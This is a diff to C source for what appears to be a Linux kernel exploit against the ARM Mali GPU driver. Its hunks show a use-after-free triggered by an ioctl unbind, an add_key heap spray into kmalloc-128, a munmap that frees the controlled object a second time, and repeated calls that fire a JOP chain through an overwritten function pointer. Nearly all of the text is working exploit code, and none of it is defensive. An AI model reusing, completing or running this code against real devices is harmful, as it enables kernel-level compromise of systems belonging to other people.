@@ -170,9 +170,7 @@ mmap_result_t mali_mmap_allocation(int mali_fd, uint32_t gpu_vaddr) {
 }
 
 
-void mali_cleanup_mapping_to_do_decrement_on_uaf_obj(mmap_result_t mapping) {
-    printf("[*] Causing function pointer overwrite...\n");
-    
+void mali_do_munmap(mmap_result_t mapping) {
     if (mapping.success && mapping.addr) {
         if (munmap(mapping.addr, mapping.size) != 0) {
             printf("  Failed to unmap %p: %s\n", mapping.addr, strerror(errno));
@@ -362,9 +360,6 @@ int trigger_overwritten_function_pointer() {
 
     // Try a small read
     ssize_t bytes_read = read(fd, jop_buffer, sizeof(jop_buffer));
-    if (bytes_read < 0) {
-        printf("[-] Read failed with error: %s\n", strerror(errno));
-    }
     
     close(fd);
     
@@ -468,24 +463,16 @@ int main() {
 
 
     // STEP 5: TRIGGER UAF AND SPRAY
-    printf("\n[5] Triggering UAF and spraying with add_key\n");
+    printf("\n[5 + 6] Triggering UAF and spraying with add_key then doing munmap for write\n");
 
     // Trigger unbind to free the object
     ioctl(mali_fd, MALI_IOC_MEM_UNBIND, &unbind_params);
     
     // Spray using add_key - this allocates in kmalloc-128
     key_serial_t spray_key = add_key("user", "spray_0", fake_mali_alloc_buff, sizeof(fake_mali_alloc_buff), KEY_SPEC_PROCESS_KEYRING);
-    
-    if (spray_key < 0) {
-        printf("[-] add_key failed: %s, should still be in the heap\n", strerror(errno));
-    } else {
-        printf("[+] Spray successful (key_id=%d)\n", spray_key);
-    }
-
 
     // STEP 6: CALL MUNMAP ON THE VICTIM TO DECREMENT THE TARGET POINTER IN THE UAF OBJECT
-    printf("\n[6] Cause second mali_mem_allocation_struct_destory on controlled mali_alloc\n");
-    mali_cleanup_mapping_to_do_decrement_on_uaf_obj(mapping);
+    mali_do_munmap(mapping);
 
 
     // Now we have free'd that memory twice and we have looped the freelist
@@ -494,7 +481,11 @@ int main() {
     // The SLUB allocator uses first 8 bytes of free memory to store a pointer to the next free element
     // If we set this to null and dont free the memory, the chain will be broken and this should fix everything
     // Just make sure we don't free the returned memory again
+    
+    // Seems a bit happier when we call it twice? Might be a quirk of memcpy or something
     trigger_overwritten_function_pointer();
+    trigger_overwritten_function_pointer();
+
     printf("\n[7] Triggered JOP chain via %s...\n", PROC_FILE); // dont waste time printing before trigger, gotta fix the freelist ASAP
 
 
